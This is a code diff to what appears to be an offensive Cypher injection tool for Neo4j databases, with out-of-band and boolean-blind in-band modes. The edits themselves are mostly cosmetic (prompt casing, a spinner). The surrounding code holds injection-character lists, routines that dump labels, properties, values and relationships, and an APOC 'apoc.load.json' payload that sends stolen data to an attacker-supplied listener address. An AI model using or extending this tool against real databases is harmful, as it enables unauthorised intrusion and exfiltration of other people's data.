@@ -388,7 +388,6 @@ class oob_Neo4jInjector:
         csv = False
         apoc = False
         print("")
-        # injection_characters = ["'", "\"", "'})", "\"})", f"{random_num}"]
         injection_characters = [
             f"{self.random_num}'",
             f"{self.random_num}\"",
@@ -427,7 +426,7 @@ class oob_Neo4jInjector:
             nested_dict = {'-': {'apoc_version': apoc_version}}
             convert_dict_to_table(nested_dict)
             check_vulnerability(apoc_version)
-            option = input("\nUse APOC to exfiltrate? (y|N): ").lower()
+            option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
             if option == "y":
                 self.exfil_payload = csv_exfil
             else:
@@ -461,7 +460,7 @@ class oob_Neo4jInjector:
             nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
             convert_dict_to_table(nested_dict)
         elif ("apoc" not in self.exfil_payload):
-            if (input(colored("[!] LOAD CSV blocked, try with APOC? (y|N) ", "red")).lower() == "y"):
+            if (input(colored("[!] LOAD CSV blocked, try with APOC? (Y|N) ", "red")).lower() == "y"):
                 self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
                 self.get_version()
             sys.exit()
@@ -607,9 +606,12 @@ class ib_Neo4jInjector:
         self.working_char = ""
 
     def update_print(self, printer, print_event, stop_event):
+        animation = "|/-\\"
+        anim_index = 0
         while (not stop_event.is_set()):
             if (print_event.is_set()):
-                print(f"[-] Dumping: {printer.get_whole()}", end="\r")
+                print(f"[{animation[anim_index % len(animation)]}] dumping: {printer.get_whole()}", end="\r")
+                anim_index += 1
                 print_event.clear()
 
     def inject_payload(self, payload):
@@ -683,7 +685,7 @@ class ib_Neo4jInjector:
         url, data = self.prepare_request_data(encoded_payload)
         self.base_case = self.execute_request(url, data)
         if (not self.base_case or self.base_case.status_code == 500):
-            if (input(colored("Seems like something went wrong, continue? (y|N)", "red")).lower != "y"):
+            if (input(colored("Seems like something went wrong, continue? (Y|N)", "red")).lower != "y"):
                 sys.exit()
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability [{injection_character}]", end='\r', flush=True)
@@ -813,7 +815,7 @@ class ib_Neo4jInjector:
         for count_index, size in label_sizes.items():
             label = Printer(self.threads)
             label_part_sizes = label.split_into_parts(size)
-            print(f"[-] Dumping: {label.get_whole()}", end="\r")
+            print(f"[{animation[anim_index % len(animation)]}] dumping: {label.get_whole()}", end="\r")
             offset = 0
             threads = []
             print_event = threading.Event()
@@ -922,7 +924,7 @@ class ib_Neo4jInjector:
             for count_index, size in size_dict.items():
                 pr0perty = Printer(self.threads)
                 pr0perty_part_sizes = pr0perty.split_into_parts(size)
-                print(f"[-] Dumping: {pr0perty.get_whole()}", end="\r")
+                print(f"[{animation[anim_index % len(animation)]}] dumping: {pr0perty.get_whole()}", end="\r")
                 offset = 0
                 threads = []
                 print_event = threading.Event()
@@ -1049,7 +1051,7 @@ class ib_Neo4jInjector:
                 for count_index, size in size_dict.items():
                     value = Printer(self.threads)
                     value_part_sizes = value.split_into_parts(size)
-                    print(f"[-] Dumping: {value.get_whole()}", end="\r")
+                    print(f"[{animation[anim_index % len(animation)]}] dumping: {value.get_whole()}", end="\r")
                     offset = 0
                     threads = []
                     print_event = threading.Event()
@@ -1174,7 +1176,7 @@ class ib_Neo4jInjector:
         for count_index, size in rel_type_sizes_dict.items():
             rel_type = Printer(self.threads)
             rel_type_part_sizes = rel_type.split_into_parts(size)
-            print(f"[-] Dumping: {rel_type.get_whole()}", end="\r")
+            print(f"[{animation[anim_index % len(animation)]}] dumping: {rel_type.get_whole()}", end="\r")
             offset = 0
             threads = []
             print_event = threading.Event()
@@ -1280,7 +1282,7 @@ class ib_Neo4jInjector:
             for count_index, size in size_dict.items():
                 rel = Printer(self.threads)
                 rel_part_sizes = rel.split_into_parts(size)
-                print(f"[-] Dumping: {rel.get_whole()}", end="\r")
+                print(f"[{animation[anim_index % len(animation)]}] dumping: {rel.get_whole()}", end="\r")
                 offset = 0
                 threads = []
                 print_event = threading.Event()
@@ -1396,7 +1398,7 @@ def main():
     parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
 
-    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC version of it")
+    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC.LOAD.JSON")
     parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode, uses boolean based injection")
 
     parser.add_argument("--dump-all", action="store_true", help="Dumps all data")
